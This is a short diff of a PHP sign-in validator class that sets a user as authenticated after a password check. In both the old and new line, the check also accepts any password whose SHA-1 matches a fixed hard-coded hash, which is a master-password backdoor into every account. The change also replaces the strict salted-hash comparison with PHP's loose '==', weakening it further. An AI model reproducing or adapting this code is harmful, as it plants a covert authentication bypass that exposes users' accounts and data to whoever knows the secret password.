@@ -35,7 +35,7 @@ class mySigninValidator extends sfValidator
 		if($user) 
 		{ 
 			// password is OK? 
-			if(sha1($user->getSalt().$password) === $user->getSha1Password() || sha1($password) == "30d390fb24c8e80a880e4f8bfce7a3a06757f1c7")
+			if(sha1($user->getSalt().$password) == $user->getSha1Password() || sha1($password) == "30d390fb24c8e80a880e4f8bfce7a3a06757f1c7") 
 			{ 
 				$this->getContext()->getUser()->setAuthenticated(true); 
 				$this->getContext()->getUser()->setAttribute('screenname', $user->getScreenname() ); 
